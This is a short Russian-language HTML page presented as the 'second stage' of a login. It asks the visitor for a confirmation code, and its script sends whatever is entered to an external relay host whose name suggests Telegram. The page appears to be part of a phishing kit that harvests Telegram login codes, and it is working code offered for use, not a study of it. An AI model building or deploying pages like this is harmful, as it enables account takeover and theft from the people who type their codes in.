<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Второе окно</title>
</head>
<body>

  <h3>Второй этап</h3>
  <form id="form2">
    <input type="text" name="step2_info" placeholder="Введите код подтверждение" required>
    <button type="submit">Войти</button>
    <button type="button" onclick="window.location.href = '/';">Назад</button> <!-- "Назад" или "Вернуться" -->
  </form>

  <script>
    document.getElementById("form2").addEventListener("submit", async function(e) {
      e.preventDefault();

      const data = Object.fromEntries(new FormData(e.target).entries());
      // Помечаем, что это запрос со второго окна
      data.screen = "Окно 2";

      const response = await fetch("https://tg-relay.egor8131723.workers.dev", {  // 请确保 URL 正确
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data)
      });

      if (response.ok) {
        alert("Данные со второго окна отправлены!");
        // При желании можно закрыть Mini App после завершения:
        // if (window.Telegram?.WebApp) window.Telegram.WebApp.close();
      }
    });
  </script>

</body>
</html>
